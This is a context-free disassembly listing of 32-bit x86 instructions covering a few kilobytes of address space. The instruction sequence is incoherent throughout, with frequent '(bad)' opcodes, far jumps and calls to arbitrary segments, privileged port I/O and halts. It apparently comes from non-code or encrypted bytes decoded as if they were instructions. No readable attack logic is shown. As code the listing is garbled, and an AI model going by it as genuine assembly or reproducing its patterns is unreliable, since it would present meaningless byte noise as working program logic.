  40e18e:	bound  ebx,QWORD PTR [eax-0x12]
  40e191:	popf   
  40e192:	cdq    
  40e193:	das    
  40e194:	mov    ebx,es
  40e196:	repnz int 0x67
  40e199:	ds mov edi,0x94df3469
  40e19f:	rcl    esi,cl
  40e1a1:	pop    ebp
  40e1a2:	jns    0x40e1ea
  40e1a4:	add    al,0x50
  40e1a6:	sahf   
  40e1a7:	cmp    DWORD PTR [edi+0x53],esi
  40e1aa:	xchg   esp,eax
  40e1ab:	adc    ecx,eax
  40e1ad:	dec    ebp
  40e1ae:	cmc    
  40e1af:	add    ch,BYTE PTR [ebx]
  40e1b1:	jmp    0xf9b0:0x410a1b49
  40e1b8:	stos   BYTE PTR es:[edi],al
  40e1b9:	(bad)  
  40e1ba:	dec    esp
  40e1bb:	ds repz xchg ecx,eax
  40e1be:	fldcw  WORD PTR [esi+esi*4-0x19]
  40e1c2:	aas    
  40e1c3:	jmp    0xa665:0x5b68b9dd
  40e1ca:	jg     0x40e1cd
  40e1cc:	jno    0x40e245
  40e1ce:	ret    
  40e1cf:	scas   al,BYTE PTR es:[edi]
  40e1d0:	xchg   BYTE PTR [ecx+0x524a6d5],cl
  40e1d6:	push   edx
  40e1d7:	mov    ds:0x36543fee,eax
  40e1dc:	cmp    BYTE PTR [ecx-0x6e],bh
  40e1df:	dec    edx
  40e1e0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e1e1:	dec    ecx
  40e1e2:	call   0xda00:0x60f6ba9f
  40e1e9:	cld    
  40e1ea:	mov    edi,0x98ee4b41
  40e1ef:	mov    ecx,0x8f6b5d23
  40e1f4:	cmp    eax,0x526df91e
  40e1f9:	or     DWORD PTR [ebx-0x52e2f29a],ebp
  40e1ff:	int3   
  40e200:	(bad)  
  40e201:	sbb    BYTE PTR [eax+0x24428d66],dl
  40e207:	cdq    
  40e208:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e209:	mov    cl,0x8f
  40e20b:	sbb    al,0x59
  40e20d:	in     al,0x8e
  40e20f:	jle    0x40e249
  40e211:	xor    al,0x8f
  40e213:	cmp    esp,eax
  40e215:	mov    ah,0xba
  40e217:	or     ebp,DWORD PTR [esi-0x71113018]
  40e21d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e21e:	push   es
  40e21f:	inc    eax
  40e220:	mov    edx,0x5b04765b
  40e225:	es push esp
  40e227:	shl    DWORD PTR [esi+0x54f02f19],0xb2
  40e22e:	jns    0x40e23f
  40e230:	adc    DWORD PTR [ebx+edx*2],ecx
  40e233:	or     bl,ch
  40e235:	xlat   BYTE PTR ds:[ebx]
  40e236:	shl    dl,0x39
  40e239:	or     ah,bh
  40e23b:	and    ebx,eax
  40e23d:	push   0x6559e4f0
  40e242:	test   al,0x6c
  40e244:	rcr    edi,0x19
  40e247:	not    DWORD PTR [edx+0x48]
  40e24a:	or     DWORD PTR [ecx+0x2d],esp
  40e24d:	jns    0x40e2a3
  40e24f:	clc    
  40e250:	sub    esp,esi
  40e252:	jecxz  0x40e24c
  40e254:	fstp   DWORD PTR [edx-0x40d47e6b]
  40e25a:	mov    ds:0x6c7c3940,al
  40e25f:	and    DWORD PTR [ecx],ebp
  40e261:	imul   edx,DWORD PTR [ebx],0x47c74b0b
  40e267:	mov    ebp,0x46628be7
  40e26c:	es sbb bh,ch
  40e26f:	mov    esi,0x29debc74
  40e274:	push   eax
  40e275:	add    al,0x27
  40e277:	push   esi
  40e278:	mov    edi,0x2fca41d6
  40e27d:	inc    edi
  40e27e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e27f:	mov    ebx,0x467a0f73
  40e284:	imul   esi,edi,0xb
  40e287:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e288:	enter  0x6f65,0x61
  40e28c:	and    edx,DWORD PTR [ecx+0x5cecb7e6]
  40e292:	test   eax,0xe0ef093d
  40e297:	or     BYTE PTR [ecx+esi*8+0x48],0x53
  40e29c:	lods   eax,DWORD PTR ds:[esi]
  40e29d:	popa   
  40e29e:	nop
  40e29f:	push   es
  40e2a0:	xadd   BYTE PTR [ebx],dh
  40e2a3:	xchg   BYTE PTR [ebx-0x58999f1e],cl
  40e2a9:	sahf   
  40e2aa:	lahf   
  40e2ab:	fcmovnb st,st(6)
  40e2ad:	sub    BYTE PTR [eax-0x23df69fd],dl
  40e2b3:	icebp  
  40e2b4:	(bad)  
  40e2b5:	and    ecx,DWORD PTR [ebp+esi*8+0x4e]
  40e2b9:	inc    ebp
  40e2ba:	push   ebx
  40e2bb:	push   0xfc02c5eb
  40e2c0:	xor    BYTE PTR [esi],ah
  40e2c2:	into   
  40e2c3:	aaa    
  40e2c4:	imul   esi,DWORD PTR [esi+0x618ba6c5],0x55d6caa
  40e2ce:	leave  
  40e2cf:	je     0x40e25e
  40e2d1:	(bad)  
  40e2d2:	mov    BYTE PTR [edi-0x19],bh
  40e2d5:	adc    bl,BYTE PTR [eax-0x4535fc7c]
  40e2db:	in     al,0xb6
  40e2dd:	rol    DWORD PTR [ecx],1
  40e2df:	sbb    ebp,DWORD PTR [edi+0x39]
  40e2e2:	test   DWORD PTR [ecx+eiz*1-0x3a],edx
  40e2e6:	popw   ds
  40e2e8:	and    eax,0xa7d12bca
  40e2ed:	and    DWORD PTR [ebx+0x45623cc1],esi
  40e2f3:	sub    eax,0x367325c9
  40e2f8:	sub    al,0x4f
  40e2fa:	mov    ecx,0xc0718eac
  40e2ff:	imul   ebx,DWORD PTR [ebx+0x7c1abe],0xffffff82
  40e306:	daa    
  40e307:	into   
  40e308:	jp     0x40e2d9
  40e30a:	fimul  WORD PTR [edx]
  40e30c:	jge    0x40e346
  40e30e:	jo     0x40e344
  40e310:	xor    ecx,DWORD PTR [ecx+0x25]
  40e313:	push   esp
  40e314:	pushf  
  40e315:	and    al,0x10
  40e317:	push   ss
  40e318:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e319:	mov    dh,0x7f
  40e31b:	dec    esi
  40e31c:	or     BYTE PTR [ebx+0x34],ah
  40e31f:	imul   edi,esi,0xffffffd9
  40e322:	mov    cl,ch
  40e324:	jns    0x40e2b0
  40e326:	mov    ebx,0xc817413
  40e32b:	rol    BYTE PTR [edi],0x74
  40e32e:	sbb    BYTE PTR [edx-0x5c90d9be],dh
  40e334:	and    eax,DWORD PTR [ecx-0x65]
  40e337:	jle    0x40e349
  40e339:	or     cl,BYTE PTR ds:0x6db32c0a
  40e33f:	push   ecx
  40e340:	and    al,0x97
  40e342:	js     0x40e360
  40e344:	or     esp,edi
  40e346:	push   edi
  40e347:	gs jp  0x40e38d
  40e34a:	jle    0x40e3ae
  40e34c:	pop    ecx
  40e34d:	and    eax,DWORD PTR [ecx+0x6d]
  40e350:	addr16 push es
  40e352:	loope  0x40e2e3
  40e354:	hlt    
  40e355:	dec    ebx
  40e356:	mov    ds:0x388f749a,al
  40e35b:	mov    esi,ss
  40e35d:	int3   
  40e35e:	or     eax,0xa6190db5
  40e363:	shl    al,cl
  40e365:	mov    esp,0x552cd2ac
  40e36a:	jmp    0x23ec4bc1
  40e36f:	pop    esp
  40e370:	and    BYTE PTR [esi-0x60],ch
  40e373:	pop    esi
  40e374:	mov    al,0x59
  40e376:	pop    ebp
  40e377:	(bad)  
  40e379:	jae    0x40e3ab
  40e37b:	push   es
  40e37c:	sar    BYTE PTR [esp+edi*4-0x156ff9f1],0x51
  40e384:	idiv   DWORD PTR [ecx-0x3d]
  40e387:	push   esp
  40e388:	inc    ecx
  40e389:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e38a:	call   0x4baa:0xfb40e4e9
  40e391:	pusha  
  40e392:	and    ah,BYTE PTR [ebx-0x2a436249]
  40e398:	fild   QWORD PTR gs:[eax+0x6f]
  40e39c:	sahf   
  40e39d:	jae    0x40e358
  40e39f:	pop    edi
  40e3a0:	add    DWORD PTR [edi],ebp
  40e3a2:	enter  0x2334,0xe
  40e3a6:	jae    0x40e339
  40e3a8:	shl    BYTE PTR [ecx+0x6c1c15a8],1
  40e3ae:	dec    ebx
  40e3af:	sbb    DWORD PTR [esp+ecx*4+0x6f68a6f6],edi
  40e3b6:	push   es
  40e3b7:	and    BYTE PTR [ebp+0x1b],0xac
  40e3bb:	das    
  40e3bc:	dec    esi
  40e3bd:	pop    esi
  40e3be:	push   esi
  40e3bf:	in     al,dx
  40e3c0:	daa    
  40e3c1:	inc    ecx
  40e3c2:	inc    ecx
  40e3c3:	and    DWORD PTR [esi-0x16],esi
  40e3c6:	mov    dl,0x51
  40e3c8:	and    eax,0x421f8c
  40e3cd:	jle    0x40e3b4
  40e3cf:	fucomp st(6)
  40e3d1:	sahf   
  40e3d2:	jmp    0x43698944
  40e3d7:	test   DWORD PTR [ebx],0x47a6580f
  40e3dd:	shl    eax,cl
  40e3df:	outs   dx,BYTE PTR ds:[esi]
  40e3e0:	adc    eax,DWORD PTR [ebx+0x75]
  40e3e3:	and    DWORD PTR [ebp+0x3],0xffffff95
  40e3e7:	inc    eax
  40e3e8:	rcl    ch,0xe3
  40e3eb:	lea    esp,[edx+0x69970af1]
  40e3f1:	mov    DWORD PTR [edi+0x607c4054],ebp
  40e3f7:	cld    
  40e3f8:	jl     0x40e403
  40e3fa:	nop
  40e3fb:	xchg   edx,eax
  40e3fc:	jmp    DWORD PTR [eax]
  40e3fe:	sub    eax,0x5d3be660
  40e403:	dec    ebp
  40e404:	fadd   DWORD PTR [edx+0x5c]
  40e407:	out    dx,eax
  40e408:	sub    BYTE PTR [edx+0x16],ah
  40e40b:	jnp    0x40e3fc
  40e40d:	fld    QWORD PTR [eax+edx*4+0x59]
  40e411:	jle    0x40e43d
  40e413:	cmc    
  40e414:	pop    edi
  40e415:	inc    ebx
  40e416:	lahf   
  40e417:	adc    eax,0x85c3c953
  40e41c:	loope  0x40e463
  40e41e:	xor    edi,edx
  40e420:	hlt    
  40e421:	adc    al,0x31
  40e423:	mov    esp,0x3812a15e
  40e428:	dec    esi
  40e429:	dec    eax
  40e42a:	add    esi,eax
  40e42c:	enter  0x2118,0xf6
  40e430:	aad    0x6a
  40e432:	cmp    ecx,DWORD PTR [esi+0x5268bc1a]
  40e438:	mov    esi,0xaedcbb0a
  40e43d:	or     BYTE PTR [ebx+0x764c282c],cl
  40e443:	cmp    BYTE PTR [edx],cl
  40e445:	and    al,0xd2
  40e447:	mov    eax,ds:0x9cdd5f6e
  40e44c:	stos   DWORD PTR es:[edi],eax
  40e44d:	xor    esp,DWORD PTR [edx-0x17]
  40e450:	loopne 0x40e451
  40e452:	adc    esp,eax
  40e454:	jle    0x40e413
  40e456:	mul    bl
  40e458:	pop    ecx
  40e459:	mov    ds:0xd6b9d453,al
  40e45e:	shl    DWORD PTR [edi+0x2c],1
  40e461:	mov    dh,0xb2
  40e463:	call   0x3812fd0
  40e468:	inc    ebx
  40e469:	inc    esp
  40e46a:	test   al,0xe8
  40e46c:	sub    ebp,DWORD PTR [ebp-0x4b]
  40e46f:	ret    0xe5e9
  40e472:	das    
  40e473:	cli    
  40e474:	ja     0x40e478
  40e476:	inc    eax
  40e477:	pop    es
  40e478:	xor    al,0x15
  40e47a:	shl    DWORD PTR [ebx+0x438fc934],1
  40e480:	mov    edx,0x528c5a74
  40e485:	popa   
  40e486:	xchg   DWORD PTR [ebp-0x49],eax
  40e489:	xor    BYTE PTR [ebx-0x77],dh
  40e48c:	jp     0x40e464
  40e48e:	and    al,0x9
  40e490:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e491:	(bad)  
  40e492:	fcomip st,st(7)
  40e494:	or     dl,bh
  40e496:	lods   al,BYTE PTR ds:[esi]
  40e497:	ret    0x9b14
  40e49a:	inc    esp
  40e49b:	jl     0x40e50d
  40e49d:	dec    edi
  40e49e:	arpl   WORD PTR [esp+ebx*4],dx
  40e4a1:	fcom   QWORD PTR [ebx+0x79a969c4]
  40e4a7:	jne    0x40e4d3
  40e4a9:	dec    edi
  40e4aa:	pop    ss
  40e4ab:	xchg   ebp,eax
  40e4ac:	cli    
  40e4ad:	ret    
  40e4ae:	or     ch,BYTE PTR [ebx-0x6694c3d]
  40e4b4:	or     ch,BYTE PTR ds:0xc27cfcdb
  40e4ba:	pop    ebp
  40e4bb:	fcmovnb st,st(1)
  40e4bd:	stos   DWORD PTR es:[edi],eax
  40e4be:	sub    al,0x11
  40e4c0:	test   al,dl
  40e4c2:	sub    eax,0xcfb369e6
  40e4c7:	and    dl,dh
  40e4c9:	leave  
  40e4ca:	scas   al,BYTE PTR es:[edi]
  40e4cb:	mov    edi,0xf5575786
  40e4d0:	xchg   ecx,eax
  40e4d1:	mov    ds:0xa9b90ec4,eax
  40e4d6:	xchg   ch,al
  40e4d8:	out    0xac,al
  40e4da:	mov    al,0xe
  40e4dc:	xchg   ebx,eax
  40e4dd:	cmp    DWORD PTR [edi+0x6a],edx
  40e4e0:	cs aam 0xf2
  40e4e3:	push   ebp
  40e4e4:	jo     0x40e4ed
  40e4e6:	sub    eax,0xd43fbfa5
  40e4eb:	call   0x17b5bc1c
  40e4f0:	jl     0x40e50f
  40e4f2:	loop   0x40e4db
  40e4f4:	cmp    al,0x2a
  40e4f6:	imul   ebx,DWORD PTR [edi-0x9c0bde0],0x447dd326
  40e500:	popf   
  40e501:	jns    0x40e48e
  40e503:	int    0xee
  40e505:	mov    ds:0x792c22b1,al
  40e50a:	nop
  40e50b:	fwait
  40e50c:	push   es
  40e50d:	clc    
  40e50e:	icebp  
  40e50f:	in     al,dx
  40e510:	dec    ebp
  40e511:	test   DWORD PTR [edx],edi
  40e513:	sub    bh,BYTE PTR [eax-0x47]
  40e516:	rol    DWORD PTR [edx],1
  40e518:	sbb    eax,0xd6ff234b
  40e51d:	add    bl,BYTE PTR [edi-0x6b28048]
  40e523:	xchg   edi,eax
  40e524:	xchg   ebx,eax
  40e525:	test   al,0x10
  40e527:	(bad)  
  40e528:	xchg   edx,eax
  40e529:	push   0xd9be664a
  40e52e:	(bad)  [ebx+0x1c]
  40e531:	and    ah,BYTE PTR [ecx]
  40e533:	das    
  40e534:	data16 cmp cl,0xb4
  40e538:	mov    ebx,0xdd0e29d3
  40e53d:	mov    ecx,0xa352e390
  40e542:	fdiv   st(1),st
  40e544:	fld    DWORD PTR [eax]
  40e546:	push   eax
  40e547:	fidivr WORD PTR [esp+esi*8+0x2a]
  40e54b:	lds    ecx,FWORD PTR [edx+edx*2]
  40e54e:	into   
  40e54f:	jne    0x40e5b8
  40e551:	and    cl,BYTE PTR [eax-0x31]
  40e554:	adc    BYTE PTR [ebx-0x67c043f9],0x75
  40e55b:	into   
  40e55c:	or     bl,BYTE PTR [edx]
  40e55e:	mov    esp,0x6074c2f2
  40e563:	inc    edx
  40e564:	push   edx
  40e565:	inc    eax
  40e566:	jo     0x40e504
  40e568:	fisttp QWORD PTR [ecx]
  40e56a:	inc    ebx
  40e56b:	sahf   
  40e56c:	mov    ebp,0x9b9c6239
  40e571:	leave  
  40e572:	repnz adc al,0x67
  40e575:	push   es
  40e576:	rcpps  xmm3,XMMWORD PTR [ecx]
  40e579:	lea    eax,[ecx]
  40e57b:	(bad)  
  40e57c:	mov    ah,0xc1
  40e57e:	lock loop 0x40e5e1
  40e581:	adc    DWORD PTR [ecx+0x7],esi
  40e584:	addr16 jmp 0x40e57d
  40e587:	sbb    esi,ecx
  40e589:	sbb    DWORD PTR [edx-0x19],eax
  40e58c:	mov    DWORD PTR [ecx],esp
  40e58e:	dec    edi
  40e58f:	imul   ecx,esp,0x39
  40e592:	mov    ebp,0x95b791f8
  40e597:	(bad)  
  40e598:	in     al,dx
  40e599:	(bad)  
  40e59a:	push   esp
  40e59b:	mov    dl,BYTE PTR ds:0xdcca11c5
  40e5a1:	rcl    BYTE PTR [edi+edi*4],0x1b
  40e5a5:	pop    esi
  40e5a6:	sar    ebp,cl
  40e5a8:	inc    edx
  40e5a9:	fnsave ds:[ebx]
  40e5ac:	fimul  WORD PTR [ecx]
  40e5ae:	pop    edx
  40e5af:	or     DWORD PTR [ebx-0x6becb20a],edi
  40e5b5:	cdq    
  40e5b6:	(bad)  
  40e5b7:	xchg   edx,eax
  40e5b8:	lock fs and bl,cl
  40e5bc:	rol    dh,cl
  40e5be:	sub    edx,DWORD PTR [ebx+ebx*1+0x509fb3dc]
  40e5c5:	sbb    BYTE PTR [ebx+ebx*1-0x58e27da6],al
  40e5cc:	sbb    BYTE PTR [eax-0x5b],bl
  40e5cf:	subps  xmm4,XMMWORD PTR [esi+0x3771f8f2]
  40e5d6:	xchg   BYTE PTR [eax],ch
  40e5d8:	fwait
  40e5d9:	mov    ebp,0x15bc7d2a
  40e5de:	out    0x20,al
  40e5e0:	sub    dh,BYTE PTR [ecx-0x15]
  40e5e3:	out    0xed,eax
  40e5e5:	add    dl,bh
  40e5e7:	scas   al,BYTE PTR es:[edi]
  40e5e8:	es hlt 
  40e5ea:	pop    edi
  40e5eb:	dec    esp
  40e5ec:	inc    eax
  40e5ed:	or     BYTE PTR [edi+0x78],dl
  40e5f0:	jmp    0x40e5a5
  40e5f2:	imul   edx,DWORD PTR [edi],0xa02ec893
  40e5f8:	sti    
  40e5f9:	outs   dx,BYTE PTR ds:[esi]
  40e5fa:	push   esi
  40e5fb:	push   edi
  40e5fc:	push   ds
  40e5fd:	in     eax,0x52
  40e5ff:	mov    ah,0xc6
  40e601:	add    BYTE PTR [edx+edi*4-0x4accb314],0x74
  40e609:	jle    0x40e656
  40e60b:	jno    0x40e5e3
  40e60d:	and    dl,bl
  40e60f:	ret    0xdb3f
  40e612:	loop   0x40e5c8
  40e614:	push   ebp
  40e615:	pop    eax
  40e616:	jbe    0x40e5b2
  40e618:	dec    ecx
  40e619:	mov    dl,bh
  40e61b:	scas   eax,DWORD PTR es:[edi]
  40e61c:	fist   WORD PTR [eax+ebx*2-0xd1e2207]
  40e623:	push   ds
  40e624:	in     eax,dx
  40e625:	test   eax,edx
  40e627:	sahf   
  40e628:	iret   
  40e629:	repz mov bl,0x3e
  40e62c:	inc    ebx
  40e62d:	lock xchg ebx,eax
  40e62f:	mov    ch,0x9c
  40e631:	push   cs
  40e632:	push   ds
  40e633:	test   BYTE PTR [eax],dl
  40e635:	ret    
  40e636:	adc    edi,ecx
  40e638:	loop   0x40e644
  40e63a:	cmp    cl,BYTE PTR [eax+0x3f8b11a]
  40e640:	inc    ebp
  40e641:	imul   edx,edi,0x35
  40e644:	push   ss
  40e645:	mov    ch,0xe6
  40e647:	aad    0x95
  40e649:	iret   
  40e64a:	pop    ds
  40e64b:	mov    ch,0xeb
  40e64d:	sub    bh,BYTE PTR [edx]
  40e64f:	mov    bh,0xa3
  40e651:	daa    
  40e652:	jo     0x40e639
  40e654:	or     BYTE PTR [edi-0x66],0x28
  40e658:	jecxz  0x40e6af
  40e65a:	retf   0x143a
  40e65d:	jns    0x40e625
  40e65f:	push   cs
  40e660:	stc    
  40e661:	std    
  40e662:	ins    DWORD PTR es:[edi],dx
  40e663:	test   BYTE PTR [esi-0xb6e7a46],al
  40e669:	add    ch,BYTE PTR [ecx+edi*1]
  40e66c:	scas   al,BYTE PTR es:[edi]
  40e66d:	cmp    ecx,DWORD PTR [edx+0x56]
  40e670:	inc    edi
  40e671:	jno    0x40e6ca
  40e673:	gs dec eax
  40e675:	pop    ecx
  40e676:	jnp    0x40e6cb
  40e678:	call   FWORD PTR [ebp-0x58]
  40e67b:	ss xchg esp,eax
  40e67d:	std    
  40e67e:	mov    ah,cl
  40e680:	rol    DWORD PTR [edx-0x17a3a0b],1
  40e686:	jb     0x40e63d
  40e688:	add    BYTE PTR [esi],bh
  40e68a:	pop    edx
  40e68b:	sbb    BYTE PTR [ecx-0x32],ah
  40e68e:	rcr    DWORD PTR [edx],1
  40e690:	push   ds
  40e691:	call   0x7b7c:0x70d663cb
  40e698:	and    eax,ebp
  40e69a:	lds    ebx,FWORD PTR [esi]
  40e69c:	push   edx
  40e69d:	xor    bh,BYTE PTR ds:0x2db2491f
  40e6a3:	(bad)  
  40e6a4:	or     ebx,DWORD PTR [edx+0x6e]
  40e6a7:	jecxz  0x40e66f
  40e6a9:	addr16 dec edx
  40e6ab:	push   0x7095b254
  40e6b0:	or     DWORD PTR [eax],esi
  40e6b2:	(bad)  ds:0xece89075
  40e6b8:	inc    edx
  40e6b9:	mov    ebx,0x392aaef6
  40e6be:	cs sbb al,0xc5
  40e6c1:	stos   DWORD PTR es:[edi],eax
  40e6c2:	push   edx
  40e6c3:	out    dx,al
  40e6c4:	or     ah,ah
  40e6c6:	adc    BYTE PTR [eax+0x7fb41085],dl
  40e6cc:	push   es
  40e6cd:	pushw  es
  40e6cf:	mov    ebp,0x6ba32d6d
  40e6d4:	jne    0x40e6ec
  40e6d6:	dec    esp
  40e6d7:	and    DWORD PTR gs:[ebx-0x29],ebx
  40e6db:	mov    dh,0x8
  40e6dd:	shl    BYTE PTR [edi+0x2f],cl
  40e6e0:	out    dx,al
  40e6e1:	jge    0x40e75b
  40e6e3:	(bad)  
  40e6e4:	mov    ds:0xc8f771ff,eax
  40e6e9:	cs js  0x40e709
  40e6ec:	adc    al,dh
  40e6ee:	mov    eax,ds:0x1864beb8
  40e6f3:	cmp    BYTE PTR [edi+0x70a869ef],dh
  40e6f9:	push   ebp
  40e6fa:	push   eax
  40e6fb:	mov    DWORD PTR [ebp-0x28],ecx
  40e6fe:	mov    al,ds:0x9827081c
  40e703:	shl    BYTE PTR [ebx-0x295fc8a8],0x4d
  40e70a:	fimul  DWORD PTR [ecx-0x69]
  40e70d:	mov    edi,0xc181d778
  40e712:	(bad)  
  40e713:	in     al,dx
  40e714:	mov    BYTE PTR [edx],bl
  40e716:	push   ds
  40e717:	jnp    0x40e6f8
  40e719:	jecxz  0x40e70e
  40e71b:	xchg   DWORD PTR [edx-0x44],esp
  40e71e:	pop    edx
  40e71f:	stos   DWORD PTR es:[edi],eax
  40e720:	xor    esi,DWORD PTR [edi]
  40e722:	bound  eax,QWORD PTR [ebx+0x5bf1bf54]
  40e728:	fsubr  st,st(7)
  40e72a:	mov    dh,0x73
  40e72c:	mov    bh,0xd
  40e72e:	jns    0x40e75e
  40e730:	push   es
  40e731:	int3   
  40e732:	dec    esp
  40e733:	adc    edx,0x1c2ef8b2
  40e739:	mov    ebp,esp
  40e73b:	mov    esi,0xde639dcc
  40e740:	xor    eax,0x70339971
  40e745:	lods   eax,DWORD PTR ds:[esi]
  40e746:	push   es
  40e747:	or     esi,DWORD PTR [edx-0x1e]
  40e74a:	dec    esi
  40e74b:	cwde   
  40e74c:	cwde   
  40e74d:	xchg   edx,eax
  40e74e:	(bad)  [ecx]
  40e750:	mov    eax,ds:0x12118f50
  40e755:	in     al,dx
  40e756:	cmp    BYTE PTR [ecx+0x548ecf85],bh
  40e75c:	cdq    
  40e75d:	inc    ebx
  40e75e:	cmp    al,0x5a
  40e760:	fwait
  40e761:	cmp    bh,dh
  40e763:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e764:	(bad)  
  40e765:	or     esi,DWORD PTR [esi-0x7c1db784]
  40e76b:	fistp  DWORD PTR [esi-0x7]
  40e76e:	int    0x25
  40e770:	dec    ecx
  40e771:	mov    ch,0x1c
  40e773:	shl    BYTE PTR [ebx-0x48],0x37
  40e777:	fcom   QWORD PTR [ebp+0x6facce9b]
  40e77d:	ins    BYTE PTR es:[edi],dx
  40e77e:	mov    esi,0xba3f2115
  40e783:	test   DWORD PTR [edi+0x10],ebp
  40e786:	sbb    ebx,DWORD PTR [edx-0x787e8fc2]
  40e78c:	add    eax,0x7e949bef
  40e791:	ror    BYTE PTR [esp+ecx*2],cl
  40e794:	sti    
  40e795:	cmc    
  40e796:	jmp    FWORD PTR [ecx]
  40e798:	frstor [ebp+0x72708168]
  40e79e:	sub    DWORD PTR [edx-0xa14ae43],esi
  40e7a4:	xchg   ecx,eax
  40e7a5:	daa    
  40e7a6:	pop    ss
  40e7a7:	shl    BYTE PTR [ebx],1
  40e7a9:	xchg   esp,eax
  40e7aa:	mov    dl,0xe7
  40e7ac:	lea    ebx,[ebx+eiz*4+0x8]
  40e7b0:	pushf  
  40e7b1:	add    eax,0xcc9b02a5
  40e7b6:	icebp  
  40e7b7:	out    dx,al
  40e7b8:	jmp    0x2671fb23
  40e7bd:	adc    dh,BYTE PTR [eax-0x3f]
  40e7c0:	mov    ebx,0x8c7af00a
  40e7c5:	lock inc edi
  40e7c7:	sbb    ebp,0xffffff90
  40e7ca:	aad    0xd7
  40e7cc:	fwait
  40e7cd:	ds (bad) 
  40e7cf:	push   esp
  40e7d0:	mov    esp,0xaa8cfe76
  40e7d5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e7d6:	push   ebp
  40e7d7:	loopne 0x40e7dc
  40e7d9:	test   dl,0x95
  40e7dc:	scas   eax,DWORD PTR es:[edi]
  40e7dd:	les    esi,FWORD PTR [ebx-0x40]
  40e7e0:	je     0x40e84b
  40e7e2:	test   DWORD PTR [edx-0xe],0x6d821bd9
  40e7e9:	jb     0x40e840
  40e7eb:	push   ebp
  40e7ec:	test   al,0x28
  40e7ee:	leave  
  40e7ef:	clc    
  40e7f0:	popf   
  40e7f1:	mov    al,ds:0x20b2afa7
  40e7f6:	aaa    
  40e7f7:	scas   al,BYTE PTR es:[edi]
  40e7f8:	push   eax
  40e7f9:	mov    ah,BYTE PTR [edx+0x263296b2]
  40e7ff:	xchg   ecx,eax
  40e800:	mov    bh,0xdb
  40e802:	inc    esi
  40e803:	jo     0x40e828
  40e805:	js     0x40e824
  40e807:	push   ds
  40e808:	iret   
  40e809:	sbb    ebp,DWORD PTR [edx+0x1a]
  40e80c:	and    edx,DWORD PTR [edx-0x17]
  40e80f:	and    eax,0x9e9950a0
  40e814:	jle    0x40e7ee
  40e816:	mov    eax,0x5ed54903
  40e81b:	jg     0x40e7c0
  40e81d:	cwde   
  40e81e:	mov    esi,0xc2e8068f
  40e823:	sub    BYTE PTR [ebp+0x3f5b04fe],dl
  40e829:	jle    0x343eec27
  40e82f:	aaa    
  40e830:	daa    
  40e831:	rol    DWORD PTR [ebx],cl
  40e833:	icebp  
  40e834:	push   esi
  40e835:	adc    eax,0xa72c5bce
  40e83a:	cmp    esp,DWORD PTR [ebx-0x68]
  40e83d:	or     al,0xb0
  40e83f:	(bad)  
  40e840:	lock leave 
  40e842:	stc    
  40e843:	je     0x40e82c
  40e845:	inc    ecx
  40e846:	(bad)  
  40e847:	and    esi,esp
  40e849:	pop    esp
  40e84a:	rcl    BYTE PTR [edx-0x54],cl
  40e84d:	cli    
  40e84e:	sahf   
  40e84f:	in     al,0xda
  40e851:	inc    esp
  40e852:	inc    ecx
  40e853:	fnstenv [edi-0x241af793]
  40e859:	mov    ebx,0x8cb0abe5
  40e85e:	or     BYTE PTR ds:0xeb9c2797,ch
  40e864:	stos   DWORD PTR es:[edi],eax
  40e865:	test   al,0xe0
  40e867:	stos   BYTE PTR es:[edi],al
  40e868:	push   ecx
  40e869:	add    dh,BYTE PTR [esi-0x8]
  40e86c:	pop    ebp
  40e86d:	test   BYTE PTR [ebx],cl
  40e86f:	fprem  
  40e871:	repnz stos DWORD PTR es:[edi],eax
  40e873:	fist   WORD PTR [ebp+edi*8+0x53]
  40e877:	fcmove st,st(5)
  40e879:	pushf  
  40e87a:	sbb    BYTE PTR [edi],dh
  40e87c:	(bad)  
  40e87d:	push   0x3736a4a8
  40e882:	nop
  40e883:	(bad)  
  40e884:	hlt    
  40e885:	mov    ebp,0x751e5946
  40e88a:	cmp    BYTE PTR [edx+edi*2+0x105bf6ec],ah
  40e891:	cmp    ebx,0xffffffa1
  40e894:	jmp    0x35c00808
  40e899:	imul   esi,DWORD PTR [esi],0x5c
  40e89c:	in     al,0x45
  40e89e:	(bad)  
  40e8a0:	adc    ebx,DWORD PTR [eax+0xab7af43]
  40e8a6:	or     edi,DWORD PTR [ecx]
  40e8a8:	jno    0x40e89f
  40e8aa:	sbb    DWORD PTR [edi],esp
  40e8ac:	imul   esi,DWORD PTR [edi+0x22],0xef626d05
  40e8b3:	mov    ch,bl
  40e8b5:	jge    0x40e856
  40e8b7:	xchg   ecx,eax
  40e8b8:	push   es
  40e8b9:	aas    
  40e8ba:	cmc    
  40e8bb:	imul   eax,DWORD PTR [ecx+0x23],0x5093b532
  40e8c2:	retf   0xcea4
  40e8c5:	adc    bl,BYTE PTR [ebx+0x16]
  40e8c8:	ins    BYTE PTR es:[edi],dx
  40e8c9:	jno    0x40e935
  40e8cb:	fwait
  40e8cc:	outs   dx,BYTE PTR ds:[esi]
  40e8cd:	xor    al,0x38
  40e8cf:	dec    ecx
  40e8d0:	cmp    DWORD PTR [eax],0xffffffad
  40e8d3:	mov    eax,DWORD PTR [ebx-0x6d]
  40e8d6:	or     al,0xaa
  40e8d8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e8d9:	clc    
  40e8da:	mov    ds:0x9c66c2c8,al
  40e8df:	(bad)  
  40e8e0:	pop    ds
  40e8e1:	or     ah,BYTE PTR [ebp+esi*8+0x3a]
  40e8e5:	xchg   esi,eax
  40e8e6:	add    bh,BYTE PTR [ecx]
  40e8e8:	mov    ebx,eax
  40e8ea:	jg     0x40e907
  40e8ec:	xor    al,BYTE PTR [eax+0x76]
  40e8ef:	dec    ecx
  40e8f0:	test   eax,0x18b0d1d2
  40e8f5:	pop    ebp
  40e8f6:	fcmovb st,st(1)
  40e8f8:	inc    esi
  40e8f9:	xchg   edi,eax
  40e8fa:	or     al,0xd1
  40e8fc:	out    dx,al
  40e8fd:	jg     0x40e8f3
  40e8ff:	push   ecx
  40e900:	(bad)  
  40e901:	ror    BYTE PTR [edx],cl
